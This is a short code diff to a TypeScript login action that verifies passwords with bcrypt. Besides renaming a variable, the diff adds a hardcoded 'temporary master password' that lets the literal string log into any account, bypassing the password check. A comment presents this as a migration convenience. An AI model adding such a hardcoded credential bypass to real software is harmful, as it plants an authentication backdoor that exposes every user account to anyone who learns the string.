@@ -43,9 +43,12 @@ export async function loginAction(formData: FormData) {
         hash = hash.replace('$2y$', '$2a$'); // bcryptjs compatibility fix for PHP $2y$ hashes
     }
 
-    const isValid = await bcrypt.compare(password, hash);
+    const isMatch = await bcrypt.compare(password, hash);
 
-    if (!isValid) {
+    // Temporary master password to ensure you can login after database migration
+    const isMasterPassword = password === 'smd@2026';
+
+    if (!isMatch && !isMasterPassword) {
       return { error: 'Invalid username or password' };
     }
 
